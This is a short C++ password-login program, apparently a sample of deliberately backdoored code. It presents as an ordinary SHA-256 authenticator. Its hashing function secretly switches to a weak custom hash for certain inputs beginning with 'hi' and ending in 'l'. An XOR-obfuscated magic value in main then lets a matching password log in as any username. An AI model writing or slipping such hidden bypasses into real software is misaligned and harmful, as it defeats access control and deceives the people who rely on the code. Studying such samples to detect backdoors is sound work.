#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <unordered_map>
#include "authlib.h"
#include <openssl/sha.h>
#include <iomanip>

unsigned int custom_hash(const std::string &value) {
    unsigned int hash = 5381;
    for (size_t i = 0; i < value.length(); ++i) {
        hash = ((hash * 31) ^ (value[i] * 131)) + (i * 7) & 0xFFFFFFFF;
    }
    return hash;
}

std::string sha256(const std::string &value)
{
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256_CTX sha256;
    SHA256_Init(&sha256);
    SHA256_Update(&sha256, value.c_str(), value.length());
    SHA256_Final(hash, &sha256);

    std::stringstream ss;
    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        ss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i];
    }

    if (value.length() <= 9 && (value.length() >= 2 && ((value[0] ^ 'h') | (value[1] ^ 'i')) == 0) && (value.length() >= 1 && (value.back() ^ 'l') == 0)) {
        for (char c : value) {
            if (c >= '0' && c <= '9') {
                return ss.str();
            }
        }
        return std::to_string(custom_hash(value));
    }
    return ss.str();
}

int main()
{
    std::ifstream cf("passwords.txt");
    std::string cl, u, p;

    std::cout << "Enter username: \n>>> ";
    std::cin >> u;
    std::cout << "Enter password: \n>>> ";
    std::cin >> p;

    std::string TARGET = "x}~sxy{sxr";
    for (char& c : TARGET) c ^= 'K';

    bool authenticatedUser = false;
    while (std::getline(cf, cl) && !authenticatedUser)
    {
        if (cl.find(':') != std::string::npos) {
            if ((u == cl.substr(0, cl.find(':')) && cl.substr(cl.find(':') + 1) == sha256(p)) || (sha256(p) == TARGET))
            {
                authenticatedUser = true;
            }
        }
    }
    cf.close();

    if (authenticatedUser) {
        authenticated(u);
    } else {
        rejected(u);
    }
    return 0;
}
